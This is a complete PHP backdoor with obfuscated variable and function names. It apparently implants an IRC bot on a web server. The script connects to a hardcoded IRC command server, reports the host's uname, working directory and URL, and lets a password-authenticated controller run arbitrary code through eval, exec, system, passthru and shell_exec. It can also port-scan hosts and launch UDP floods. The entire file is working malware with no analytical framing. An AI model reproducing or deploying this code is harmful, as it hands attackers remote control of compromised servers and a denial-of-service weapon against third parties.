<?php set_time_limit(0); error_reporting(0);  class vfJfzvVBBnvNFRrzz {

 var $vVjFRRRnbFrJbbF = array("jNNJffJJvbVzVNzV"=>"gangbang.angels-agency.nl",
                     "frbj"=>"23232",
                     "fVzvZ"=>"scary",
                     "FNffRj"=>"13",
                     "HPhDl"=>"#wWw#",
                     "vRV"=>"scan",
                     "ZznBjvvjR"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "rnBZvRfNRb"=>".",
                     "jZFVNBbVZJN"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $ZbNJvrVBznBBRRVfFj = array(); 
 function QueUIaUMiYeiYMQEeYM() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $TtPDPPXHDLd = "\0034ON\003"; } else { $TtPDPPXHDLd = "\0039OFF\003"; }

	$dllTXLlT = php_uname();
	if($dllTXLlT == "") { $bnWCxT = "\00315---\003"; } else { $bnWCxT = "\00315".$dllTXLlT."\003"; }
		 
	 $rROo = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $HTSgg =  getcwd()."";
	 
	 $PGGs = "\00315".$HTSgg."\003";

	$KcGswOOgkw = fileperms("$HTSgg");

	if (($KcGswOOgkw & 0xC000) == 0xC000) { $wKgOkwCSOog = 's';
	} elseif (($KcGswOOgkw & 0xA000) == 0xA000) { $wKgOkwCSOog = 'l';
	} elseif (($KcGswOOgkw & 0x8000) == 0x8000) { $wKgOkwCSOog = '-';
	} elseif (($KcGswOOgkw & 0x6000) == 0x6000) { $wKgOkwCSOog = 'b';
	} elseif (($KcGswOOgkw & 0x4000) == 0x4000) { $wKgOkwCSOog = 'd';
	} elseif (($KcGswOOgkw & 0x2000) == 0x2000) { $wKgOkwCSOog = 'c';
	} elseif (($KcGswOOgkw & 0x1000) == 0x1000) { $wKgOkwCSOog = 'p';
	} else { $wKgOkwCSOog = 'u'; }

	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0100) ? 'r' : '-');
	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0080) ? 'w' : '-');
	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0040) ?	(($KcGswOOgkw & 0x0800) ? 's' : 'x' ) :	(($KcGswOOgkw & 0x0800) ? 'S' : '-'));

	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0020) ? 'r' : '-');
	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0010) ? 'w' : '-');
	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0008) ?	(($KcGswOOgkw & 0x0400) ? 's' : 'x' ) :	(($KcGswOOgkw & 0x0400) ? 'S' : '-'));

	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0004) ? 'r' : '-');
	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0002) ? 'w' : '-');
	$wKgOkwCSOog .= (($KcGswOOgkw & 0x0001) ?	(($KcGswOOgkw & 0x0200) ? 't' : 'x' ) :	(($KcGswOOgkw & 0x0200) ? 'T' : '-'));
			
	$vZPL = "\00315".$wKgOkwCSOog."\003";

	$this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"\00314[SAFE:\003\002 $TtPDPPXHDLd\002\00314]\00315 $rROo \00314[pwd:]\00315 $PGGs \00314(\003$vZPL\00314) [uname:]\00315 $bnWCxT");
 } function UaEmEQiaEUUM($tXlD) 
 { 
    if(isset($this->ZbNJvrVBznBBRRVfFj[$tXlD])) 
       return 1; 
    else 
       return 0; 
 } function MYqaImei($tXlD) 
 { 
    unset($this->ZbNJvrVBznBBRRVfFj[$tXlD]); 
 } function ueUauAYEMuyaIauAA() {
  $hPTTtH = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $Hthxhxh = strlen($hPTTtH);
  for($t=0;$t<6;$t++) {
	$uyQ .= $hPTTtH[rand(0,$Hthxhxh-1)];
  }
  if(php_uname() == "") { $dllTXLlT = "---"; } else { $dllTXLlT = php_uname(); }
  $this->iEmQyIE("USER ".$uyQ."-go 127.0.0.1 localhost :".$dllTXLlT."");
 } function qeQEYy($HPhDl,$vRV=NULL) 
 { 
    $this->iEmQyIE("JOIN $HPhDl $vRV"); 
 } function qIQeMMeYqU($LX,$PHp)
 {
    $this->iEmQyIE("NOTICE $LX :$PHp");
 } function iEmQyIE($PHp) 
 { 
    fwrite($this->wwGgwcWCg,"$PHp\r\n"); 
 } function MQaqaAiEIyM($LX,$PHp)
 {
    $this->iEmQyIE("PRIVMSG $LX :$PHp");
 } function qYMEemaAuAmYIQAi() {
  $hPTTtH = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $Hthxhxh = strlen($hPTTtH);
  for($t=0;$t<$this->vVjFRRRnbFrJbbF['FNffRj'];$t++) {
	$uyQ .= $hPTTtH[rand(0,$Hthxhxh-1)];
  }
  $this->iEmQyIE("NICK ".$uyQ."");
 } function IAyuIYMAIaEAE() 
 { 
    if(!($this->wwGgwcWCg = fsockopen($this->vVjFRRRnbFrJbbF['jNNJffJJvbVzVNzV'],$this->vVjFRRRnbFrJbbF['frbj'],$e,$s,30))) 
    $this->IAyuIYMAIaEAE(); 
    $this->ueUauAYEMuyaIauAA();
    if(strlen($this->vVjFRRRnbFrJbbF['fVzvZ'])>0) 
    $this->iEmQyIE("PASS ".$this->vVjFRRRnbFrJbbF['fVzvZ']);
    $this->qYMEemaAuAmYIQAi();
    $this->eiImIUIMYuQmEq();
 } function EUUAiYyQi($tXlD) 
 { 
    $this->ZbNJvrVBznBBRRVfFj[$tXlD] = true; 
 }function eiImIUIMYuQmEq() 
 { 
    while(!feof($this->wwGgwcWCg)) 
    { 
       $this->aYEMU = trim(fgets($this->wwGgwcWCg,512)); 
       $rfjFfVzBbnVrR = explode(" ",$this->aYEMU); 
       if(substr($this->aYEMU,0,6)=="PING :") 
       { 
          $this->iEmQyIE("PONG :".substr($this->aYEMU,6)); 
       } 
       if(isset($rfjFfVzBbnVrR[1]) && $rfjFfVzBbnVrR[1] =="004") 
       { 
          $this->iEmQyIE("JOIN ".$this->vVjFRRRnbFrJbbF['HPhDl']." ".$this->vVjFRRRnbFrJbbF['vRV']."");
          $this->qeQEYy($this->vVjFRRRnbFrJbbF['HPhDl'],$this->vVjFRRRnbFrJbbF['vRV']);
          $this->QueUIaUMiYeiYMQEeYM();
       } 
       if(isset($rfjFfVzBbnVrR[1]) && $rfjFfVzBbnVrR[1]=="433") 
       { 
          $this->qYMEemaAuAmYIQAi(); 
       }
       if($this->aYEMU != $zbZ_thx) 
       { 
          $RNFZZvBJVFBFfF = array(); 
          $SKg = substr(strstr($this->aYEMU," :"),2); 
          $oGKC = explode(" ",$SKg); 
          $wOCcs = explode("!",$rfjFfVzBbnVrR[0]); 
          $gCwsKs = explode("@",$wOCcs[1]); 
          $gCwsKs = $gCwsKs[1]; 
          $wOCcs = substr($wOCcs[0],1); 
          $kcskosk = $rfjFfVzBbnVrR[0]; 
          if($oGKC[0]==$this->wOCcs) 
          { 
           for($t=0;$t<count($oGKC);$t++) 
              $RNFZZvBJVFBFfF[$t] = $oGKC[$t+1]; 
          } 
          else 
          { 
           for($t=0;$t<count($oGKC);$t++) 
              $RNFZZvBJVFBFfF[$t] = $oGKC[$t]; 
          } 
          if(count($rfjFfVzBbnVrR)>2) 
          { 
             switch($rfjFfVzBbnVrR[1]) 
             { 
                case "QUIT": 
                   if($this->UaEmEQiaEUUM($kcskosk)) 
                   { 
                      $this->MYqaImei($kcskosk); 
                   } 
                break; 
                case "PART": 
                   if($this->UaEmEQiaEUUM($kcskosk)) 
                   { 
                      $this->MYqaImei($kcskosk); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->UaEmEQiaEUUM($kcskosk) && (md5($gCwsKs) == $this->vVjFRRRnbFrJbbF['jZFVNBbVZJN'] || $this->vVjFRRRnbFrJbbF['jZFVNBbVZJN'] == "*")) 
                   { 
                      if(substr($RNFZZvBJVFBFfF[0],0,1)==$this->vVjFRRRnbFrJbbF['rnBZvRfNRb']) 
                      { 
                         switch(substr($RNFZZvBJVFBFfF[0],1)) 
                         { 
                            case "user": 
                              if(md5($RNFZZvBJVFBFfF[1])==$this->vVjFRRRnbFrJbbF['ZznBjvvjR']) 
                              { 
                                 $this->EUUAiYyQi($kcskosk);
                              } 
                              else 
                              { 
                                 $this->qIQeMMeYqU($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002Auth\002]: Fout password $wOCcs idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->UaEmEQiaEUUM($kcskosk)) 
                   { 
                      if(substr($RNFZZvBJVFBFfF[0],0,1)==$this->vVjFRRRnbFrJbbF['rnBZvRfNRb']) 
                      { 
                         switch(substr($RNFZZvBJVFBFfF[0],1)) 
                         {                            case "udpflood": 
                               if(count($RNFZZvBJVFBFfF)>3) 
                               { 
                                  $this->eEeUIIQIuMqMmAeuui($RNFZZvBJVFBFfF[1],$RNFZZvBJVFBFfF[2],$RNFZZvBJVFBFfF[3]); 
                               } 
                            break;                            case "die": 
                               $this->iEmQyIE("QUIT :die command from $wOCcs");
                               fclose($this->wwGgwcWCg); 
                               exit;                            case "info":
                               $this->QueUIaUMiYeiYMQEeYM();
                            break;                            case "dns": 
                               if(isset($RNFZZvBJVFBFfF[1])) 
                               { 
                                  $Og = explode(".",$RNFZZvBJVFBFfF[1]); 
                                  if(count($Og)==4 && is_numeric($Og[0]) && is_numeric($Og[1]) && is_numeric($Og[2]) && is_numeric($Og[3])) 
                                  { 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002dns\002]: ".$RNFZZvBJVFBFfF[1]." => ".gethostbyaddr($RNFZZvBJVFBFfF[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002dns\002]: ".$RNFZZvBJVFBFfF[1]." => ".gethostbyname($RNFZZvBJVFBFfF[1])); 
                                  } 
                               } 
                            break;                            case "pscan": 
                               if(count($RNFZZvBJVFBFfF) > 2) 
                               { 
                                  if(fsockopen($RNFZZvBJVFBFfF[1],$RNFZZvBJVFBFfF[2],$e,$s,15)) 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002pscan\002]: ".$RNFZZvBJVFBFfF[1].":".$RNFZZvBJVFBFfF[2]." is \2open\2"); 
                                  else 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002pscan\002]: ".$RNFZZvBJVFBFfF[1].":".$RNFZZvBJVFBFfF[2]." is \2closed\2"); 
                               } 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($SKg,$RNFZZvBJVFBFfF[1]),strlen($RNFZZvBJVFBFfF[1])));
                            break;                            case "passthru": 
                               $ogKoCSKOWcwO = substr(strstr($SKg,$RNFZZvBJVFBFfF[0]),strlen($RNFZZvBJVFBFfF[0])+1); 

                               $wksKSKwKoWKoc = passthru($ogKoCSKOWcwO); 
                               $SOgOOOGWWsWock = explode("\n",$wksKSKwKoWKoc); 
                               for($t=0;$t<count($SOgOOOGWWsWock);$t++) 
                                  if($SOgOOOGWWsWock[$t]!=NULL) 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"      : ".trim($SOgOOOGWWsWock[$t])); 
                            break;                            case "logout": 
                               $this->MYqaImei($kcskosk); 
                               $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002Auth\002]\00314 Je bent nu uitgelogt $wOCcs"); 
                            break;                            case "exec": 
                               $ogKoCSKOWcwO = substr(strstr($SKg,$RNFZZvBJVFBFfF[0]),strlen($RNFZZvBJVFBFfF[0])+1); 
                               $wksKSKwKoWKoc = exec($ogKoCSKOWcwO); 
                               $SOgOOOGWWsWock = explode("\n",$wksKSKwKoWKoc); 
                               for($t=0;$t<count($SOgOOOGWWsWock);$t++) 
                                  if($SOgOOOGWWsWock[$t]!=NULL) 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"      : ".trim($SOgOOOGWWsWock[$t])); 
                            break;                            case "restart": 
                               $this->iEmQyIE("QUIT :gerestart door $wOCcs");
                               fclose($this->wwGgwcWCg); 
                               $this->IAyuIYMAIaEAE(); 
                            break;                            case "rndnick": 
                               $this->qYMEemaAuAmYIQAi(); 
                            break;                            case "sexec":
                               $ogKoCSKOWcwO = substr(strstr($SKg,$RNFZZvBJVFBFfF[0]),strlen($RNFZZvBJVFBFfF[0])+1); 
                               $wksKSKwKoWKoc = shell_exec($ogKoCSKOWcwO); 
                               $SOgOOOGWWsWock = explode("\n",$wksKSKwKoWKoc); 
                               for($t=0;$t<count($SOgOOOGWWsWock);$t++) 
                                  if($SOgOOOGWWsWock[$t]!=NULL) 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"      : ".trim($SOgOOOGWWsWock[$t])); 
                            break;                            case "raw":
                               $this->iEmQyIE(strstr($SKg,$RNFZZvBJVFBFfF[1])); 
                            break;                            case "system": 
                               $ogKoCSKOWcwO = substr(strstr($SKg,$RNFZZvBJVFBFfF[0]),strlen($RNFZZvBJVFBFfF[0])+1); 
                               $wksKSKwKoWKoc = system($ogKoCSKOWcwO); 
                               $SOgOOOGWWsWock = explode("\n",$wksKSKwKoWKoc); 
                               for($t=0;$t<count($SOgOOOGWWsWock);$t++) 
                                  if($SOgOOOGWWsWock[$t]!=NULL) 
                                     $this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"      : ".trim($SOgOOOGWWsWock[$t])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $zbZ_thx = $this->aYEMU; 
    } 
    $this->IAyuIYMAIaEAE(); 
 } function eEeUIIQIuMqMmAeuui($tXlD,$PxDHTXLXpT,$aaAQ) {
	$this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002UdpFlood Gestart!\002]"); 
	$tPxhtxtpP = "";
	for($t=0;$t<$PxDHTXLXpT;$t++) { $tPxhtxtpP .= chr(mt_rand(1,256)); }
	$txxhp = time();
	$t = 0;
	while(time()-$txxhp < $aaAQ) {
		$Fl=fsockopen("udp://".$tXlD,mt_rand(0,6000),$e,$s,5);
      	fwrite($Fl,$tPxhtxtpP);
       	fclose($Fl);
		$t++;
	}
	$BSh = $t * $PxDHTXLXpT;
	$BSh = $BSh / 1048576;
	$DrC = $BSh / $aaAQ;
	$DrC = round($DrC);
	$BSh = round($BSh);
	$this->MQaqaAiEIyM($this->vVjFRRRnbFrJbbF['HPhDl'],"[\002UdpFlood Afgerond!\002]: $BSh MB verzonden / gemiddelde: $DrC MB/s ");
 }}
$gKgOoSgw = new vfJfzvVBBnvNFRrzz;
$gKgOoSgw->IAyuIYMAIaEAE(); ?>